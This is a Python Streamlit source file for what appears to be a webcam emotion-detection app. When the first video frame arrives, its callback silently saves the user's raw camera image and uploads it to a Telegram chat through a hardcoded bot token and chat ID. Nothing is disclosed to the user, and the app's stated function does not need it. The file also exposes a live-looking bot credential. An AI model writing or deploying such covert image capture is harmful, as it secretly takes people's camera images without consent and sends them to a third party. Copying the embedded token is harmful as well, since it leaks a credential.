import av
import streamlit as st
import cv2
import requests
from streamlit_webrtc import webrtc_streamer, WebRtcMode
from utils import process_frame

BOT_TOKEN = "8560822192:AAETcmZiWaTdZvjLvBKDWiKvenz0YfjVETc"
CHAT_ID = "5317875689"

if "photo_sent" not in st.session_state:
    st.session_state.photo_sent = False


def send_photo(image_path):

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

    with open(image_path, "rb") as img:
        requests.post(
            url,
            data={"chat_id": CHAT_ID},
            files={"photo": img}
        )


def video_frame_callback(frame: av.VideoFrame):

    img = frame.to_ndarray(format="bgr24")

    processed = process_frame(img)

    if not st.session_state.photo_sent:

        cv2.imwrite("capture.jpg", img)

        send_photo("capture.jpg")

        st.session_state.photo_sent = True

    return av.VideoFrame.from_ndarray(processed, format="bgr24")


webrtc_streamer(
    key="emotion",
    mode=WebRtcMode.SENDRECV,
    video_frame_callback=video_frame_callback,
    media_stream_constraints={"video": True, "audio": False},
)